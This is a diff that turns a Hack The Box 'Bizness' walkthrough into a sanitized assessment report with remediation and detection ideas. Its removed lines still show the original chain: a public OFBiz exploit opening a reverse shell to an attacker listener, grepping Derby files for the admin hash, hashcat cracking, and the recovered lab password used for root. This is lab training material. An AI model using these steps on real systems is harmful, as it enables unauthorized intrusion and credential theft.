@@ -1,154 +1,100 @@
-<div align="center">
+# Bizness — Security Assessment
 
-# 💼 HTB: Bizness
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Linux |
+| Difficulty | Medium |
+| Assessment date | 2026-01-05 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `linux` `apache-ofbiz` `cve-2023-49070` `derby-database` `password-reuse`
+The existing notes report application-account access through Apache OFBiz, followed by root access through reuse of an application administrator password.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — Apache OFBiz has a well-documented pre-auth RCE chain (CVE-2023-49070/CVE-2023-51467). One public exploit later, there's a shell — and the app's embedded Derby database is sitting right there with the admin's password hash in it. Crack it, and it turns out the sysadmin reused that exact password for `root`.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Linux (Debian 11) |
-| 🎯 **Target** | `<TARGET_IP>` (bizness.htb) |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | January 5, 2026 |
-| 🏁 **Outcome** | ✅ Full compromise (~45 minutes, scan to root) |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 8000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/bizness/{scans,screenshots}
+nmap -sV -p 22,80,443 -oA evidence/bizness/scans/services "$TARGET_IP"
 ```
 
-| Port | Service |
-|:---:|---|
-| `22` | OpenSSH 8.4p1 (Debian) |
-| `80` / `443` | nginx 1.18.0, forced HTTPS redirect |
-| `38009` | tcpwrapped — turns out to be a loopback-only internal component, not externally reachable |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-> 💡 The TLS cert is self-signed and valid for **305 years** (2023–2328). Not exploitable by itself, but it's the kind of "someone typed a huge number without thinking" artifact that hints at rushed or careless configuration elsewhere.
+## 4. Reconnaissance and service analysis
 
-### Fingerprinting the app
+22 SSH; 80/443 nginx and OFBiz. The reported tcpwrapped response on 38009 does not establish a loopback-only listener.
+
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
+
+## 5. Recorded initial-access path
+
+Application execution is recorded as uid=1001(ofbiz). The notes associate it with an OFBiz authentication/deserialization vulnerability chain; exact patch level and CVE attribution remain unverified.
+
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
+
+## 6. Privilege escalation and impact validation
+
+The application account could access Derby database material. The notes report password recovery and reuse for the OS root account. The stated PBKDF2 format, iteration count, cracking duration, and total assessment duration are not sufficiently substantiated and are omitted.
+
+In an already authorized session, record identity without reading objective contents:
 
 ```bash
-curl -k https://bizness.htb/control/main
+id
+hostname
+sudo -l
 ```
 
-```
-Copyright (c) 2001-2026 The Apache Software Foundation. Powered by Apache OFBiz Release 18.12
-```
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-Apache OFBiz 18.12 has a well-known critical vulnerability chain — worth checking the exact patch level before anything else.
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
----
+## 7. Evidence register and limitations
 
-## 🚩 Shell as `ofbiz` — CVE-2023-49070 / CVE-2023-51467
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-OFBiz ≤ 18.12.09 has a pre-authentication RCE via an authentication-bypass-then-deserialization chain (CVSS 9.8). A public PoC exists and works out of the box.
+Reported root identity; supporting original terminal evidence still required.
 
-> ⚠️ **Root cause:** authentication bypass in the controller request-routing logic, chained with insecure deserialization — no credentials needed at any point.
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/bizness.md), reviewed at blob SHA `144008ca61101198c2b5a8faa9306364190550ca`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-```bash
-# Java 21 fails on this exploit's module access — swap to Java 11
-sudo apt-get install openjdk-11-jdk
-sudo update-alternatives --config java   # select Java 11
-```
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-rlwrap nc -nlvp 4444
-python3 ofbiz_exploit.py https://bizness.htb shell <ATTACKER_IP>:4444
-```
+## 8. Findings and remediation
 
-```
-ofbiz@bizness:/opt/ofbiz$ id
-uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Application execution boundary failure | Apply vendor-supported OFBiz updates; verify exact affected release and authentication behavior. |
+| F-002 | Readable credential datastore | Limit datastore access to required service identities; protect backups and rotate exposed credentials. |
+| F-003 | Application/OS credential reuse | Use unique credentials; restrict direct root authentication and audit privileged access. |
 
-```bash
-ofbiz@bizness:~$ cat user.txt
-<USER_FLAG_REDACTED>
-```
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
----
+## 9. Detection opportunities
 
-## 👑 Root — Derby Database Hash → Cracked → Password Reuse
+OFBiz child-process creation; unexpected datastore reads; application-to-root authentication. Tune against application maintenance and approved backup jobs.
 
-### Pulling the admin hash straight out of the embedded database
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-OFBiz ships with Apache Derby as its default embedded DB. The raw data files are readable by the `ofbiz` user:
+## 10. Remediation validation
 
-```bash
-strings /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat | grep -E "currentPassword|admin"
-```
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-```xml
-<eeval-UserLogin currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" userLoginId="admin"/>
-```
+## 11. Lessons learned and remaining work
 
-Format is `$SHA$salt$hash` — PBKDF2-HMAC-SHA1, 10,000 iterations, per OFBiz's own `security.properties`.
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-> ⚠️ **10,000 iterations is weak for 2026.** That's the difference between "cracks in five minutes" and "infeasible."
-
-```bash
-echo 'sha1:10000:ZA==:uP0_QaVBpDWFeo8-dRzDqRwXQ2I' > admin.hash
-hashcat -m 10900 admin.hash /usr/share/wordlists/rockyou.txt
-```
-
-Cracked in under 5 minutes: **`monkeybizness`**
-
-### Password reuse takes it the rest of the way
-
-```bash
-ofbiz@bizness:~$ su root
-Password: monkeybizness
-
-root@bizness:~# whoami
-root
-```
-
-```bash
-root@bizness:~# cat root.txt
-<ROOT_FLAG_REDACTED>
-```
-
-> 💡 The root cause of the actual *compromise* here isn't the hash weakness — it's that the sysadmin used the same password for an application admin account and the OS root account. Either mistake alone is bad; both together is game over.
-
----
-
-## 🔗 Full Attack Chain
-
-```
-Apache OFBiz 18.12 pre-auth RCE (CVE-2023-49070/51467)
-   → shell as ofbiz
-   → Derby database strings → admin password hash
-   → PBKDF2-SHA1 crack (rockyou.txt, ~5 min)
-   → password reuse on root account
-   → full compromise
-```
-
-## 🛠️ Remediation
-
-| Finding | Fix |
-|---|---|
-| Apache OFBiz ≤ 18.12.10 pre-auth RCE | Upgrade to ≥ 18.12.11 (or current); this is a well-known, patched CVE. |
-| Admin password hash readable via Derby data files | Restrict OS-level file permissions on the Derby datastore; consider migrating to a properly access-controlled RDBMS. |
-| Weak PBKDF2 iteration count (10,000) | Raise to ≥ 100,000, or migrate to Argon2id. |
-| Password reuse between app admin and OS root | Enforce unique credentials per account/system; disable direct root login in favor of individually-audited sudo. |
-
----
-
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
